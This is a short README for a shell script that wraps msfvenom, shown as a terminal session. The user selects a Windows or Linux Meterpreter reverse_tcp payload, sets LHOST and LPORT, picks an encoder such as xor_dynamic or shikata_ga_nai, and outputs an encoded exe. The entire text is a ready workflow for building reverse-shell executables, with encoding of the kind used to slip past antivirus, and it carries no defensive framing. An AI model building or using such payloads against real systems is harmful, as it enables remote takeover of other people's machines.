# msfvenom-quick-generater

root@FBI:~/文档# bash msfvenom.sh 

1) windows/x64/meterpreter/reverse_tcp
2) windows/x86/meterpreter/reverse_tcp
3) linuu/x64/meterpreter/reverse_tcp
4) linux/x86/meterpreter/reverse_tcp

Select your payload(1-4):1

Input your LHOST: 127.0.0.1

Input your LPORT: 6666

1) x64/xor_dynamic
2) x86/shikata_ga_nai

Select your encoder(default:none): 1

1) c
2) exe
3) elf

Select your formats(default:c): 2

Input your filename: IamLAJI 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor_dynamic
x64/xor_dynamic succeeded with size 560 (iteration=0)
x64/xor_dynamic chosen with final size 560
Payload size: 560 bytes
Final size of exe file: 7168 bytes
